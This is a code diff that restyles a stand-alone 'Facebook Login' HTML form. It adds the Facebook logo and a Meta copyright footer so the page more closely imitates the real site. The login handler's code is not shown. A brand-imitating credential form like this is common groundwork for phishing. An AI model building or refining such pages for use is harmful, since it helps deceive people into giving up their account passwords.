@@ -4,15 +4,78 @@
   <meta charset="UTF-8">
   <title>Facebook Login</title>
   <style>
-    body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .login-box { background: white; padding: 30px; border-radius: 10px; width: 300px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    h2 { color: #1877f2; text-align: center; }
-    input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
-    button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
-    button:hover { background-color: #145dbf; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .logo {
+      margin-bottom: 10px;
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #145dbf;
+    }
+
+    .meta-footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 13px;
+      color: #777;
+    }
+
+    .meta-footer img {
+      width: 60px;
+      margin-bottom: 5px;
+    }
   </style>
 </head>
 <body>
+
+  <!-- Facebook Logo -->
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" width="150">
+  </div>
+
+  <!-- Login Box -->
   <div class="login-box">
     <h2>Facebook Login</h2>
     <form onsubmit="handleLogin(event)">
@@ -20,6 +83,12 @@
       <input type="password" id="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
+  </div>
+
+  <!-- Meta Footer -->
+  <div class="meta-footer">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Meta_Platforms_Logo.svg" alt="Meta Logo">
+    <div>© 2025 Meta Platforms, Inc.</div>
   </div>
 
   <script>
@@ -43,5 +112,6 @@
       }
     }
   </script>
+
 </body>
 </html>
